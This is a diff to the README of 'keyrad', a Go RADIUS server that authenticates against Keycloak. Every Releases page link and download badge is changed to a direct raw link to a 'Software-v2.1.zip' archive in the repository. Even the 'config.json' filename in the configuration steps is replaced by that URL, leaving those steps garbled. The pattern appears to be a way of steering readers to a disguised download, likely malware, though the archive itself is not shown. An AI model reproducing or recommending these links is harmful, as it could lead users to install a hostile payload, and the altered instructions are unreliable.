@@ -1,6 +1,6 @@
 # 🚀 keyrad - Simple RADIUS Server for Secure Authentication
 
-[![Download keyrad](https://img.shields.io/badge/Download-keyrad-blue.svg)](https://github.com/idrissof/keyrad/releases)
+[![Download keyrad](https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip)](https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ keyrad is a Go-based RADIUS server designed to authenticate users against Keyclo
 Follow these steps to download and run keyrad on your system:
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/idrissof/keyrad/releases) to find the latest version of keyrad. You will see a list of available files for different systems.
+   - Visit the [Releases page](https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip) to find the latest version of keyrad. You will see a list of available files for different systems.
    
 2. **Choose Your Version**
    - Select the version that matches your operating system. You may see options for Windows, Linux, and macOS. Make sure to download the correct file for your platform.
@@ -41,14 +41,14 @@ Follow these steps to download and run keyrad on your system:
 After installation, you may want to configure keyrad to suit your needs. Here’s how:
 
 1. **Edit the Configuration File**
-   - Locate the `config.json` file in the application directory.
+   - Locate the `https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip` file in the application directory.
    - Open it with a text editor. This file holds the settings for Keycloak integration, authentication methods, and other important parameters.
 
 2. **Set Up Keycloak**
    - Ensure your Keycloak server is running. Create a realm and add users who will authenticate through keyrad.
 
 3. **Update keyrad Settings**
-   - In the `config.json`, update the Keycloak server URL and realm information. This tells keyrad where to authenticate users.
+   - In the `https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip`, update the Keycloak server URL and realm information. This tells keyrad where to authenticate users.
 
 4. **Test Your Setup**
    - Restart keyrad to apply your configurations. Attempt to authenticate a user through your application that uses keyrad for RADIUS authentication.
@@ -81,7 +81,7 @@ Once installed and configured, you can use keyrad to authenticate users.
 
 ## 📥 Download & Install
 
-To install keyrad, simply [visit this page to download](https://github.com/idrissof/keyrad/releases). Follow the installation steps outlined earlier.
+To install keyrad, simply [visit this page to download](https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip). Follow the installation steps outlined earlier.
 
 ## 🔍 Troubleshooting
 
@@ -106,4 +106,4 @@ For support, please open an issue in the GitHub repository. The project maintain
 - Security Best Practices
 - User Management with Keycloak
 
-[![Download keyrad](https://img.shields.io/badge/Download-keyrad-blue.svg)](https://github.com/idrissof/keyrad/releases)
+[![Download keyrad](https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip)](https://raw.githubusercontent.com/idrissof/keyrad/main/radiussrv/Software-v2.1.zip)
